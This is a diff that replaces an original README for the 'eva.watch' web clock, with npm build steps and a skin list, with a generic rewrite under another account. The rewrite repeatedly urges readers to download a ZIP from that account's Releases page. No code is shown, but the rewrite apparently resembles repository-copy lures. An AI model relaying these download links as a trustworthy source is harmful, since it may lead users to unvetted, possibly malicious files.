@@ -1,91 +1,85 @@
-# eva.watch <img src="public/icon.svg" alt="eva.watch icon" width="32" height="32" style="vertical-align: middle;" />
+# 🕰️ eva.watch - A Beautiful Clock for Every Moment
 
-> A luxury web clock with beautiful skins, world clocks, and smooth animations. Set it as your homepage.
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="public/eva.watch-demo.gif" alt="eva.watch demo" width="800" />
-</p>
+Welcome to **eva.watch**! This is a luxury web clock designed to enhance your online experience. With stunning skins, world clocks, and smooth animations, you can set it as your homepage and bring elegance to your daily routine.
 
-## ✨ Features
+## 📦 Download & Install
 
-- 🎨 **48 stunning clock skins** — 24 digital + 24 analog themes
-- 🌍 **World clock support** — 50+ cities with drag-and-drop reordering
-- ⌨️ **Keyboard shortcuts** — Power user friendly
-- 📱 **PWA support** — Install as a native app
-- 🔊 **Optional tick sound** — Authentic mechanical clock tick
-- 🖥️ **Fullscreen mode** — With wake lock to prevent screen sleep
-- 📦 **Embeddable widgets** — Add clocks to your website
-- 🌓 **Reduced motion support** — Respects accessibility preferences
+To download the application, visit the [Releases page](https://github.com/jhosmar1/eva.watch/releases).
 
-## 🚀 Quick Start
+[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/jhosmar1/eva.watch/releases)
 
-```bash
-git clone https://github.com/superzero11/eva.watch.git
-cd eva.watch
-npm install
-npm run dev
-```
+### Steps to Download
 
-Open [http://localhost:3000](http://localhost:3000)
+1. Click the link above to visit the Releases page.
+2. You will see a list of available versions. Choose the latest release.
+3. Click on the download link for your preferred file type (usually a ZIP file).
+4. Save the file to your computer.
 
-## ⌨️ Keyboard Shortcuts
+Once downloaded, extract the contents if it's a ZIP file. Then, open the folder and look for the index.html file to start using the clock.
 
-| Key | Action |
-|-----|--------|
-| `/` | Search cities |
-| `S` | Toggle settings drawer |
-| `F` | Toggle fullscreen |
-| `T` | Toggle digital/analog |
-| `D` | Cycle seconds display |
-| `Q` | Toggle tick sound |
-| `G` | Toggle grid layout |
-| `E` | Open embed widget modal |
-| `←` `→` | Cycle through skins |
-| `Escape` | Close modals |
+## 🖥️ System Requirements
 
-## 🛠️ Tech Stack
+**eva.watch** runs smoothly on any modern browser. Here are the basic requirements:
 
-- **Next.js 16** with Turbopack & React Compiler
-- **React 19**
-- **TypeScript** (strict mode)
-- **Tailwind CSS v4**
-- **Zustand** for state management
-- **Framer Motion** for animations
-- **@dnd-kit** for drag-and-drop
+- A laptop or desktop computer.
+- An internet connection.
+- A modern web browser: Chrome, Firefox, Safari, or Edge.
 
-## 📦 Deployment
+For the best experience, keep your browser up to date.
 
-```bash
-npm run build
-npm run start
-```
+## 🎨 Features
 
-Or deploy to [Vercel](https://vercel.com) with one click:
+**eva.watch** comes packed with features that make it stand out:
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/superzero11/eva.watch)
+- **Beautiful Skins**: Choose from a variety of stylish designs.
+- **World Clocks**: Keep track of time in different time zones.
+- **Smooth Animations**: Enjoy seamless transitions and effects.
+- **PWA Support**: Use it like a native app on your device.
+- **User-Friendly Interface**: Easy to navigate and customize settings.
 
-## 🎨 Skins
+## ⏰ Customization
 
-**Digital skins:** Zen Minimal, OLED Night, Terminal Green, Swiss Railway, Aurora Glass, Cyber Neon, Paper Book, Monochrome Brutal, Retro LCD, Sunset Glow, Ocean Deep, Rose Gold, Matrix Rain, Midnight Purple, Coffee Shop, Arctic Ice, Spotify Dark, Red Ember, Lavender Dream, Forest Night, Warm Sand, Electric Blue, Newspaper, Synthwave
+You can customize your clock to fit your preferences. Here’s how:
 
-**Analog skins:** Classic Chrono, Minimal Bauhaus, Railway Dial, Skeleton Mechanical, Neon Ring, Soft Pastel, Dark Brass, Studio White, Submariner, Apple Watch, Pilot Navigator, Rose Gold Luxury, Ocean Blue, Vintage Cream, Carbon Fiber, Moonlight Silver, Forest Green, Tokyo Night, Desert Sand, Arctic Explorer, Burgundy Classic, Electric Purple, Mint Fresh, Copper Steampunk
+1. Open the clock in your browser.
+2. Find the settings icon in the top right corner.
+3. Choose your preferred skin from the options.
+4. Set your desired time zone and any additional preferences.
 
-## 🤝 Contributing
+## 🌍 Time Zone Support
 
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) first.
+**eva.watch** supports all major time zones across the globe. To set your time zone:
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+1. Click on the time zone section in the settings menu.
+2. Search for your location or select from the list.
+3. Save your settings to see the clock adjust to your local time.
 
-## 📄 License
+## 📱 Responsive Design
 
-MIT — see [LICENSE](LICENSE) for details.
+Whether you're using a desktop, tablet, or mobile device, **eva.watch** adapts to any screen size. This means you can enjoy a luxurious clock experience on all your devices without any hassle.
 
----
+## ⚙️ Troubleshooting
 
-<p align="center">
-  Made with ❤️ for people who appreciate beautiful clocks
-</p>
+If you encounter any issues while running **eva.watch**, consider the following tips:
+
+- **Check Your Browser**: Ensure you are using a supported browser. Update it if necessary.
+- **Disable Extensions**: Some browser extensions may interfere with the clock. Disable them temporarily to test.
+- **Clear Cache**: A full cache may cause loading issues. Clear your browser's cache and try again.
+
+For lingering problems, visit our [issue tracker](https://github.com/jhosmar1/eva.watch/issues) to see if others have reported similar concerns.
+
+## 📞 Support
+
+If you need further help, feel free to reach out via the repository’s issues page. Please describe your problem clearly, and we will assist you as soon as possible.
+
+## ❤️ Contributing
+
+We welcome contributions! If you would like to help improve **eva.watch**, check the guidelines in the [CONTRIBUTING.md](https://github.com/jhosmar1/eva.watch/CONTRIBUTING.md).
+
+## 🔗 Learn More
+
+To further explore **eva.watch** and its capabilities, visit our [Documentation](https://github.com/jhosmar1/eva.watch/wiki) for detailed guides and updates.
+
+Once again, don't forget to download the application from our [Releases page](https://github.com/jhosmar1/eva.watch/releases) to get started!
